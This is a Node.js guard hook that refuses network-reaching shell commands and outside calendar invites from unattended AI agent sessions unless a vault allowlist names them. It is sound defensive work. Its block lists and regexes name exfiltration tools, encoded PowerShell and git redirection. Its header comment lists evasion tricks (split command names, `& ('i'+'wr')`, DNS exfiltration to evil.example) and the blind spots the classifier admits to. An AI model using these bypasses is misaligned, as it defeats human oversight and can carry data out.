#!/usr/bin/env node
// outbound-gate.mjs — outbound tier 1: unattended sessions send nothing out except what the vault's allowlist names
// (Justin's guard Ballot 10.1 (a), 2026-11-17; design §6; build brief 6; DCG-V, 2026-11-18; QCI fixes, DCF, 2026-11-18;
// QCR fixes New 1, 4, 5, DCF2, 2026-11-19).
// Truncation check: the last line of this file should read FULL FILE LOADED.
//
// REQUIREMENT: in an unattended session, a shell command (Bash, PowerShell, Monitor) that reaches the network, a script
// run by an interpreter that reaches the network, and a calendar event with any guest but Justin MUST be refused
// unless the vault's allowlist (`evryn-guards/outbound-allowlist.json`) names it. In a session Justin is at, the same
// calls ASK, so the prompt reaches him (or are refused, if the vault says `attendedMode: "deny"`). Enforced by this
// vaulted hook, PreToolUse with onFailure "block"; tests/guards.test.mjs FAILS if a listed route gets through.
//
// THE ALLOWLIST PINS SCRIPTS BY CONTENT, NOT BY NAME (QCR New 1). A `pinned` entry (the team ping, the task CLI) is
// trusted only when the segment is exactly `node <script> <args…>`: no option before the script, no variable assignment in
// front, no command substitution anywhere in the command; the script resolves (real path) to that entry under the code
// root; and the script and EVERY local file it imports hash (line endings normalized) to the values in the vault's
// `outbound-pins.json`, which the approver computed from the reviewed commit. A copy elsewhere, an edited file, an edited
// import, or a preload is not the pinned script, and falls through to every other check (where a script that reaches
// the network is refused). The vault's own `ping.mjs`, run by its full path, is trusted as is: only an administrator can
// write it, and the gate checks its hash. Regex entries (git, railway, npm, gh) match the command's words from the start,
// with no variable assignment or wrapper in front.
//
// NETWORK WORDS COUNT ONLY IN COMMAND POSITION (QCR New 5): the command is split quote-aware into segments, and a client
// counts when it is a segment's first word (after `VAR=value` assignments and the wrappers listed in WRAPPERS), the word
// after `find -exec`, or the code of `bash -c`/`cmd /c`/`pwsh -c`, parsed again. A word inside a quoted argument (a commit
// message, a ping, a `--note`) is data, not a command. A command whose name is a variable or a substitution can't be
// checked, so it is refused; a substitution's own text is checked as a command AND for any network word at all.
//
// HONESTLY, WHAT THIS IS (design §6): a classifier over command TEXT, the same class as Claude Code's own permission
// classifier, with our list. On native Windows nothing structural can stop a shell command reaching the network (Claude
// Code's sandbox doesn't run there; sandboxing docs line 13). The structural version is tier 2 (Ballot 10.2, tabled).
// WHAT IT CAN'T SEE: a command assembled at run time inside a script or a PowerShell expression (`$c="cu"+"rl"; & $c` is
// refused, but `& ('i'+'wr') …` is not), an alias or function defined earlier, or a wrapper not in WRAPPERS (`parallel`,
// `ssh-agent`, a .bat of our own); a script that writes and runs another script at run time; a script run through
// something other than a named interpreter (a file association, a .lnk); a program whose network use isn't in its
// command line (an `npm test` whose tests call out, a git hook, a Python package, the backend's own code); a remote URL
// changed by editing .git/config directly (git push to "origin" then goes there); DNS lookups carrying data in the name
// (`nslookup data.evil.example`, `ping -n 1 data.evil.example`); a listening server (`python -m http.server`); WebFetch
// and WebSearch (left open on purpose: reading the web is core work, and a URL can carry data out; tier 2 closes it); MCP
// tools other than the calendar's two (Linear writes are denied by settings; Gmail send by the vault's deny rules).
// THE PINNED SCRIPTS, SAID PLAINLY: the team ping sends its message text to whatever Slack webhook the team .env names,
// and the task CLI talks to whatever database URL the .env or the process environment names; both are agent-writable, so
// a pinned script can still carry a message's text somewhere else (the vault's ping, by its full path, can't: it reads
// only the vault's webhook.json). A file swapped between this check and node reading it (milliseconds) is not seen.
// Until the guards branch is merged and the main checkout is at the approved commit, the main checkout's ping.mjs differs
// from the pinned one, so an unattended session's repo ping is REFUSED (fail closed); the vault ping still works.
// CAUGHT, each with a test: `$(echo curl)`, `c""url`, a client by full path (`C:/Windows/System32/curl.exe`), any
// -EncodedCommand abbreviation, git settings that redirect or run commands, browser and COM URL openers,
// Invoke-Expression, any script run by an interpreter whose text reaches the network, whoever wrote it (or that can't be
// read), preloads (`--import`, `-r`, `NODE_OPTIONS=`), stdin-fed code, and a fake or edited `scripts/ping.mjs`.

import fs from 'node:fs';
import path from 'node:path';
import { readStdin, guardLog, preDeny, preAsk, attended, normCmd, codeRoot, vaultJSON, allStrings, DATA, VAULT, safeName, shellParse, progName, shaText, localImports } from './lib.mjs';

// The vault's list. Missing or unreadable: the strictest list (nothing allowed), so a broken install fails closed.
const ALLOW = { justinAddresses: [], attendedMode: 'deny', allow: [], attendedAllow: [], pinned: [], ...vaultJSON('outbound-allowlist.json', {}) };
// The pinned scripts' hashes, computed by the approver from the reviewed commit. Missing: nothing is pinned.
const PINS = { entries: [], files: {}, ...vaultJSON('outbound-pins.json', {}) };

// Programs that reach the network, by name (progName: the last path part, lowercased, without .exe).
const NETSET = new Set(['curl', 'wget', 'invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm', 'ssh', 'scp', 'sftp', 'ftp', 'tftp', 'nc', 'ncat', 'netcat', 'telnet', 'socat', 'start-bitstransfer', 'bitsadmin', 'certutil', 'gh', 'railway', 'npx', 'bunx', 'pnpx', 'rsync', 'sendmail', 'send-mailmessage', 'rundll32', 'mshta']);
// The same names, for the old any-word scan, used only on the text of a command substitution.
const NET = /(^|[\s(=&/])(curl|wget|invoke-webrequest|iwr|invoke-restmethod|irm|ssh|scp|sftp|ftp|tftp|nc|ncat|netcat|telnet|socat|net\.webclient|webclient|start-bitstransfer|bitsadmin|certutil|gh|railway|npx|bunx|pnpx|rsync|sendmail|send-mailmessage|rundll32|mshta)(\.exe)?(?=$|[\s;|&)'"])/;
// Words that run the word after them (their own options skipped). `timeout` also takes a duration.
const WRAPPERS = new Set(['sudo', 'doas', 'env', 'exec', 'nohup', 'nice', 'time', 'timeout', 'command', 'builtin', 'xargs', 'watch', 'stdbuf', 'unbuffer', 'strace', 'ltrace', 'call', 'runas', 'start']);
// Shells whose code argument is parsed again as a command.
const SHELLS = new Set(['bash', 'sh', 'zsh', 'dash', 'cmd', 'powershell', 'pwsh']);
const GIT_NET = /^git(\s+-c\s+\S+)*\s+(push|pull|fetch|clone|ls-remote|remote\s+(add|set-url)|submodule\s+update|send-email|request-pull)\b/;
// git settings that send it somewhere else or run a command (QCI finding 6): an alias with "!", core.sshCommand,
// core.fsmonitor or core.hooksPath, a remote's URL, url.*.insteadOf, credential and http helpers. Refused in `git -c`,
// `git config`, `git remote add|set-url`, and the GIT_SSH* / GIT_CONFIG_* environment forms, whatever the subcommand.
const GIT_RISK = /(^|[^a-z0-9_.-])git\b[^;|&]*\s-c\s+(alias\.|core\.(sshcommand|fsmonitor|hookspath|pager|editor|askpass)|remote\.|url\.|credential\.|http\.|protocol\.|include\.)|(^|[^a-z0-9_.-])git\s+config\b[^;|&]*\s(alias\.|core\.(sshcommand|fsmonitor|hookspath|pager|editor|askpass)|remote\.|url\.|credential\.|http\.|include\.)|(^|[^a-z0-9_.-])git\s+remote\s+(add|set-url)\b/;
// Variable assignments in front of a command that redirect git or load code into node (QCR New 1: NODE_OPTIONS).
const RISKY_ENV = /^(git_ssh|git_ssh_command|git_config_\w+|git_askpass|git_proxy_command|node_options|node_path)=/i;
// Opening a URL in another program carries data out in the URL (QCI finding 12). `start` alone is too common (npm start),
// so it counts only with a URL after it; mshta and rundll32 always count (in NETSET above).
const URL_OPENER = /^(start|start-process|saps|explorer)\s+[^;|&]*?(https?|ftp|file):/;
// PowerShell's COM HTTP objects and Invoke-Expression (which runs a string, the usual way to hide a command).
const PS_RISK = /msxml2\.|winhttp\.|serverxmlhttp|(^|[\s(;|&])(iex|invoke-expression)(?=$|[\s(;'"])/;
const PKG_NET = /^(npm|pnpm|yarn|bun)\s+(i|install|ci|add|publish|update|up|exec|dlx|x)\b|^(pip3?|python3?\s+-m\s+pip|uv|poetry)\s+(install|add|download)\b/;
// Network APIs in code: inline (`node -e`, `python -c`, a PowerShell script block) or in a script this session wrote.
// (DCF 11/18: also any import of node's network modules, so `require('https').request(` and `import http from 'node:http'`
// count, not only the literal `https.request(`.)
const NET_API = /require\s*\(\s*['"]?(node:)?(https?|net|tls|dgram|undici)['"]?\s*\)|\bfrom\s+['"](node:)?(https?|net|tls|dgram)['"]|import\s*\(\s*['"](node:)?(https?|net|tls|dgram)['"]|fetch\s*\(|https?\.(request|get)\s*\(|net\.(connect|createconnection)|tls\.connect|new\s+websocket|websocket\s*\(|xmlhttprequest|urllib|requests\.(get|post|put|patch|delete|request|session)|http\.client|socket\.(socket|create_connection)|invoke-webrequest|invoke-restmethod|net\.webclient|system\.net\.http|undici|axios|node-fetch|child_process.*curl/;
// Inline code is checked for network APIs only when an interpreter runs it (node -e, python -c, pwsh -command), so a grep
// FOR the word fetch( isn't refused. The PowerShell tool's whole command is code, so it is always checked.
const INLINE = /^(node|nodejs|deno|bun|python3?|py|ruby|perl|php|pwsh|powershell)(\.exe)?(\s+\S+)*?\s+(-(e|c|p|r|ec|command)|--(eval|print))(\s|$)/;
// Any abbreviation of -EncodedCommand, -ec included (QCI finding 6), followed by base64.
const ENCODED = /(^|\s)-e[a-z]*\s+[a-z0-9+/=]{16,}/;
const RUNNERS = /(^|[\s;&|(/])(node|nodejs|python3?|py|pwsh|powershell|bash|sh|tsx|ts-node|deno|bun|cscript|wscript|cmd\s+\/c)(\.exe)?\s+(?:-[^\s]+\s+)*("?)([^\s"]+\.(m?js|cjs|ts|py|ps1|sh|bat|cmd|vbs))/g;
// A file an interpreter is told to preload (node --import/-r/--require/--loader, python -m is not a file).
const PRELOAD = /(^|[\s;&|(/])(node|nodejs|deno|bun)(\.exe)?\s+(?:\S+\s+)*?(--import|-r|--require|--loader|--experimental-loader)[\s=]+([^\s]+)/g;
// An interpreter fed code on stdin: from a file (`node < x.mjs`, `node --input-type=module < x.mjs`) or a pipe
// (`cat x.mjs | node`). A pipe can't be checked, so it is refused; a file is read like any other script.
const STDIN_FILE = /(^|[\s;&|(/])(node|nodejs|python3?|py|deno|bun|pwsh|powershell)(\.exe)?(\s+-[^\s<]+)*\s*<\s*([^\s;&|]+)/g;
const STDIN_PIPE = /\|\s*(node|nodejs|python3?|py|deno|bun|pwsh|powershell)(\.exe)?(\s+-[^\s|;&]+)*\s*($|[;&|)])/;

const re = s => { try { return new RegExp(s); } catch { return null; } };
const inCodeRoot = cwd => !!cwd && path.resolve(cwd).toLowerCase().startsWith(path.resolve(codeRoot()).toLowerCase());
const realOr = p => { try { return fs.realpathSync.native(p); } catch { return path.resolve(p); } };

// A pinned script (QCR New 1): the vault's own ping by its full path, or a script under the code root whose real path is a
// pinned entry and whose whole local import closure, on disk now, hashes to the reviewed values.
// Does this script resolve to a pinned entry at all (whatever its content)? Such a script that fails its pin is refused
// outright: the generic script check reads only the named file, and an edit to one of its imports would pass that.
export function pinnedEntry(script, cwd, pins = PINS) {
  const rel = path.relative(realOr(codeRoot()), realOr(path.resolve(cwd || codeRoot(), script))).replace(/\\/g, '/').toLowerCase();
  return (pins.entries || []).some(e => String(e).toLowerCase() === rel);
}
export function pinnedOk(script, cwd, pins = PINS) {
  const abs = path.resolve(cwd || codeRoot(), script);
  if (abs.toLowerCase() === path.join(VAULT, 'ping.mjs').toLowerCase()) return true;
  const real = realOr(abs); const root = realOr(codeRoot());
  const relOf = f => path.relative(root, f).replace(/\\/g, '/').toLowerCase();
  const rel = relOf(real);
  if (!rel || rel.startsWith('..') || path.isAbsolute(rel)) return false;
  if (!(pins.entries || []).some(e => String(e).toLowerCase() === rel)) return false;
  const want = Object.fromEntries(Object.entries(pins.files || {}).map(([k, v]) => [k.toLowerCase(), v]));
  const seen = new Set(); const todo = [real];
  while (todo.length) {
    const f = realOr(todo.pop()); const r = relOf(f);
    if (seen.has(r)) continue; seen.add(r);
    if (!want[r]) return false;                                         // a file the reviewed closure didn't have
    let buf; try { buf = fs.readFileSync(f); } catch { return false; }
    if (shaText(buf) !== want[r]) return false;                         // edited since the review
    const { rel: imps, bare } = localImports(buf.toString('utf8'));
    if (bare.length) return false;                                      // a package: not pinnable
    for (const i of imps) todo.push(path.resolve(path.dirname(f), i));
  }
  return true;
}

// Is this segment (its words, dequoted) one the vault's allowlist names? Only a plain command: no assignment or wrapper
// in front (a segment's first word is the program).
function allowedSeg(words, cwd, list, pinned) {
  if (!words.length || /^[a-z_][a-z0-9_]*=/i.test(words[0])) return false;
  if (pinned.length && /^node(\.exe)?$/i.test(words[0]) && words[1] && !words[1].startsWith('-') && pinnedOk(words[1], cwd)) return true;
  const text = normCmd(words.join(' '));
  return list.some(e => { const r = re(typeof e === 'string' ? e : e.pattern); return r && r.test(text) && (!e.cwdInCodeRoot || inCodeRoot(cwd)); });
}

// The program a segment runs, past assignments and wrappers. Returns { at, env } (at = index of the program word).
function commandAt(words) {
  const env = []; let i = 0;
  while (i < words.length) {
    const w = words[i];
    if (/^[a-z_][a-z0-9_]*=/i.test(w)) { env.push(w); i++; continue; }                  // VAR=value prefix
    if (/^\$[a-z_][\w:]*=?$/i.test(w) && (w.endsWith('=') || words[i + 1] === '=')) { i += w.endsWith('=') ? 1 : 2; continue; }   // PowerShell $x = …
    const p = progName(w);
    if (WRAPPERS.has(p) && i + 1 < words.length && !(p === 'start' && /^(https?|ftp|file):/i.test(words[i + 1]))) {
      i++; while (i < words.length && /^[-/]/.test(words[i])) i++;
      if (p === 'timeout' && /^\d/.test(words[i] || '')) i++;
      continue;
    }
    break;
  }
  return { at: i, env };
}

const segments = c => c.split(/&&|\|\||[;|\n&]/).map(s => s.trim()).filter(Boolean);
// The scripts this session wrote (PostToolUse on Write, Edit, NotebookEdit records them).
const writtenFile = session => path.join(DATA, 'outbound-written', `${safeName(session)}.json`);
const written = session => { try { return JSON.parse(fs.readFileSync(writtenFile(session), 'utf8')); } catch { return []; } };

// One segment's findings (not scripts: those are read once for the whole command below).
function segFindings(words, powershell, depth) {
  const found = [];
  const { at, env } = commandAt(words);
  for (const e of env) if (RISKY_ENV.test(e)) found.push(`a variable that redirects git or loads code into node: ${e.slice(0, 60)}`);
  if (at >= words.length) return found;
  const prog = words[at]; const p = progName(prog);
  const cseg = normCmd(words.slice(at).join(' '));
  if (prog.includes('$')) { found.push(`a command whose name is assembled at run time (it can't be checked): ${cseg.slice(0, 80)}`); return found; }
  if (GIT_RISK.test(cseg)) { found.push(`a git setting that can send it elsewhere or run a command: ${cseg.slice(0, 100)}`); return found; }
  const net = NETSET.has(p) || NETSET.has(String(prog).replace(/\\/g, '').toLowerCase().replace(/\.exe$/, '')) || (p === 'git' && GIT_NET.test(cseg.replace(/^\S+/, 'git'))) || PKG_NET.test(cseg.replace(/^\S+/, p)) || URL_OPENER.test(cseg.replace(/^\S+/, p)) || ((powershell || p === 'powershell' || p === 'pwsh') && PS_RISK.test(cseg)) || ((INLINE.test(cseg.replace(/^\S+/, p)) || powershell) && NET_API.test(cseg));
  if (net) found.push(cseg.slice(0, 120));
  // find -exec <program>: that program is a command too.
  words.forEach((w, k) => { if (/^-(exec|execdir|ok|okdir)$/.test(w) && words[k + 1] && NETSET.has(progName(words[k + 1]))) found.push(`find -exec ${progName(words[k + 1])}`); });
  // bash -c "…", cmd /c …, pwsh -command "…": the code is a command; parse it again.
  if (SHELLS.has(p) && depth < 3) {
    const k = words.findIndex((w, j) => j > at && /^(-c|\/c|\/k|-command|-commandwithargs)$/i.test(w));
    if (k > 0) found.push(...shellFindings(words.slice(k + 1).join(' '), null, null, p === 'powershell' || p === 'pwsh', depth + 1).filter(f => !/^a script/.test(f)));
  }
  return found;
}

function shellFindings(command, cwd, session, powershell = false, depth = 0) {
  const c = normCmd(command);
  const found = [];
  if (ENCODED.test(c) && /powershell|pwsh/.test(c)) found.push('an encoded PowerShell command (it can\'t be checked)');
  const { segments: segs, substs } = shellParse(command);
  // A command that substitutes another command's output ($(…), backticks, <(…)) can hide a second command inside an
  // allowlisted one, so nothing in it counts as allowlisted; and the substituted text is checked as a command and for
  // any network word at all.
  const substitutes = substs.length > 0;
  for (const s of substs) {
    if (NET.test(normCmd(s))) found.push(`a network word inside a command substitution: ${normCmd(s).slice(0, 80)}`);
    if (depth < 3) found.push(...shellFindings(s, cwd, session, powershell, depth + 1));
  }
  // A segment the vault's allowlist names (with no substitution anywhere) is trusted whole: a pinned script is the
  // reviewed one, byte for byte. Everything else is checked.
  const open = segs.filter(w => substitutes || !allowedSeg(w, cwd, ALLOW.allow, ALLOW.pinned));
  for (const w of open) found.push(...segFindings(w, powershell, depth));
  for (const w of open) { const k = w.findIndex(x => progName(x) === 'node'); const s = k >= 0 && w.slice(k + 1).find(x => !x.startsWith('-')); if (s && pinnedEntry(s, cwd) && !pinnedOk(s, cwd)) found.push(`a pinned script that isn't the reviewed one (it, or a file it imports, changed; or an option or assignment rides it): ${s}`); }
  if (powershell && PS_RISK.test(c)) found.push('PowerShell COM HTTP or Invoke-Expression');
  // Scripts run by an interpreter, WHOEVER wrote them (QCI finding 6: a script written through Bash, or a copy of one,
  // was never recorded): read each and refuse it if it reaches the network. A script that can't be read (it doesn't
  // exist yet, say, because the same command writes or copies it) can't be checked, so it is refused too. And when a
  // command both runs an interpreter and carries network code in its own text (a heredoc that writes the script it then
  // runs), it is refused whatever the file on disk says now.
  const openText = open.map(w => normCmd(w.join(' '))).join(' ; ');
  const files = [...openText.matchAll(RUNNERS)].map(m => m[5]).concat([...openText.matchAll(PRELOAD)].map(m => m[5]), [...c.matchAll(STDIN_FILE)].filter(m => open.some(w => w.some(x => progName(x) === m[2]))).map(m => m[5]));
  for (const rel of files) {
    const f = path.resolve(cwd || codeRoot(), rel).replace(/\\/g, '/').toLowerCase();
    let body = ''; try { body = fs.readFileSync(f, 'utf8').toLowerCase(); } catch { body = 'fetch('; }   // can't read it: assume the worst
    if (NET_API.test(body) || NET.test(body)) found.push(`a script that reaches the network (or can't be checked): ${rel}`);
  }
  if (open.length && STDIN_PIPE.test(c)) found.push('code piped into an interpreter (it can\'t be checked)');
  if (files.length && NET_API.test(c)) found.push('a command that runs a script and carries network code in its own text');
  return [...new Set(found)];
}

function calendarFindings(input) {
  const mine = ALLOW.justinAddresses.map(a => a.toLowerCase());
  const emails = allStrings(input).flatMap(s => [...String(s).matchAll(/[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}/gi)].map(m => m[0].toLowerCase()));
  // An attendee entry's own email field must be one of his, whatever its spelling (QCI's probe: "someone @example.com",
  // with a space, slipped past the address pattern).
  const guests = (Array.isArray(input?.attendees) ? input.attendees : []).map(a => String(typeof a === 'string' ? a : a?.email ?? '').replace(/\s+/g, '').toLowerCase());
  return [...new Set([...emails, ...guests].filter(e => !mine.includes(e)))];
}

function pre(p) {
  const t = p.tool_name || ''; const input = p.tool_input || {};
  let why = null;
  if (['Bash', 'PowerShell', 'Monitor'].includes(t)) {
    const f = shellFindings(input.command, p.cwd, p.session_id, t === 'PowerShell');
    if (f.length && attended() && segments(normCmd(input.command)).every(seg => ALLOW.attendedAllow.some(e => { const r = re(e.pattern || e); return r && r.test(seg); }))) return null;
    if (f.length) why = `this command reaches the network outside the vault's allowlist (${f.join(' · ')})`;
  } else if (/^mcp__claude_ai_google_calendar__(create_event|update_event)$/i.test(t)) {
    const g = calendarFindings(input);
    if (g.length) why = `this calendar event would invite someone other than Justin (${g.join(', ')})`;
  }
  if (!why) return null;
  guardLog({ guard: 'outbound', event: attended() ? 'pre-ask' : 'pre-deny', session: p.session_id, tool: t });
  if (attended() && ALLOW.attendedMode === 'ask') return preAsk(`Outbound gate: ${why}. Justin, allow it only if you meant it.`);
  return preDeny(`Outbound gate: ${why}. An unattended session sends nothing out except what the vault's allowlist names (Justin's guard Ballot 10.1). Don't route around it; if your task needs this, say so in your task's notes.`);
}

function post(p) {
  if (!['Write', 'Edit', 'NotebookEdit', 'MultiEdit'].includes(p.tool_name)) return null;
  const f = p.tool_input?.file_path || p.tool_input?.notebook_path;
  if (!f) return null;
  const abs = path.resolve(p.cwd || codeRoot(), f).replace(/\\/g, '/').toLowerCase();
  const list = new Set(written(p.session_id)); list.add(abs);
  fs.mkdirSync(path.dirname(writtenFile(p.session_id)), { recursive: true });
  fs.writeFileSync(writtenFile(p.session_id), JSON.stringify([...list]));
  return null;
}

const { payload } = readStdin();
let out = null;
try { out = payload.hook_event_name === 'PreToolUse' ? pre(payload) : payload.hook_event_name === 'PostToolUse' ? post(payload) : null; }
catch (e) {
  guardLog({ guard: 'outbound', event: 'ERROR', session: payload.session_id, error: String(e?.message || e).slice(0, 200) });
  if (payload.hook_event_name === 'PreToolUse' && !attended()) out = preDeny('Outbound gate: the gate hit an error, so this call is refused in an unattended session. Tell the Admiral.');
}
if (out) process.stdout.write(out);
process.exit(0);

// Truncation canary — DO NOT REMOVE: FULL FILE LOADED
